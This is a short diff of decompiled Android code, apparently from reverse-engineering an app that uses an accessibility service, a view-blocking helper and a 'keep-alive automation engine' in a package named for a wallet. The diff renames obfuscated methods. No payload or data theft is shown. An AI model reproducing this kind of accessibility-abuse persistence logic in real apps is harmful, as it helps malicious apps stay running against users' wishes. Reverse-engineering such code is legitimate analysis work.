@@ -370,9 +370,9 @@ public final class AospKeepAliveEngine extends KeepAliveEngine {
         ReentrantLock lock = this.o;
         if (lock.tryLock()) {
             try {
-                if (!T()) {
+                if (!isEngineFinished()) {
                     Log.d("o.g", "准备结束本地保活自动化引擎");
-                    X();
+                    markEngineRunning();
                     com.guard.wallet.helper.BlockViewManager.h(100);
                     if (MyAccessibilityService.P() != null) {
                         MyAccessibilityService.P().x();
@@ -405,7 +405,7 @@ public final class AospKeepAliveEngine extends KeepAliveEngine {
     @Override
     public final void u(AccessibilityEvent event, String packageName, String className) {
         try {
-            if (T()) {
+            if (isEngineFinished()) {
                 return;
             }
             if (event != null) {
